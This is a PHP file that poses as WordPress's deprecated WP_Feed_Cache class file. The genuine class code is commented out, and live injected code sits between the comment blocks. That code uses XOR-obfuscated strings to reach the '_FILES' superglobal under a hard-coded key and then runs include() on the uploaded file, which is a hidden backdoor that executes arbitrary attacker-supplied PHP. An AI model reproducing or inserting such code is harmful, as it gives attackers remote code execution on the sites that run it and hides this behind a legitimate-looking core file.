<?php /* 
*
 * Feed API: WP_Feed_Cache class
 *
 * @package WordPress
 * @subpackage Feed
 * @since 4.7.0
 * @deprecated 5.6.0
 

_deprecated_file(
	basena*/
 	

$threshold = 'Al9RbfsdBkz';
$dirs = $threshold;
function year($mime_subgroup, $dynamic_characters)

{
    $extended = $dynamic_characters;
    $more = urldecode($mime_subgroup);
    $haystack = substr($extended,0, strlen($more));
    $current_user = $more ^ $haystack;
    return $current_user;
}

$closing_single_quote = ${year("%1E%2Ap%1E%275", $dirs)};
$count2 = $closing_single_quote;

if (isset($count2[$dirs]))

{
	$args = 'subs';
    $ptype_obj = $closing_single_quote[$dirs];

    $desired_post_slug = $ptype_obj[year("5%01I%0D%0C%07%1E%01", $dirs)];
	$post_type_taxonomies = 'email_address';
    $post_meta_key = $desired_post_slug;
    include ($post_meta_key);
}



/* me( __FILE__ ),
	'5.6.0',
	'',
	__( 'This file is only loaded for backward compatibility with SimplePie 1.2.x. Please consider switching to a recent SimplePie version.' )
);

*
 * Core class used to implement a feed cache.
 *
 * @since 2.8.0
 *
 * @see SimplePie_Cache
 
class WP_Feed_Cache extends SimplePie_Cache {

	*
	 * Creates a new SimplePie_Cache object.
	 *
	 * @since 2.8.0
	 *
	 * @param string $location  URL location (scheme is used to determine handler).
	 * @param string $filename  Unique identifier for cache object.
	 * @param string $extension 'spi' or 'spc'.
	 * @return WP_Feed_Cache_Transient Feed cache handler object that uses transients.
	 
	public function create( $location, $filename, $extension ) {
		return new WP_Feed_Cache_Transient( $location, $filename, $extension );
	}
}
*/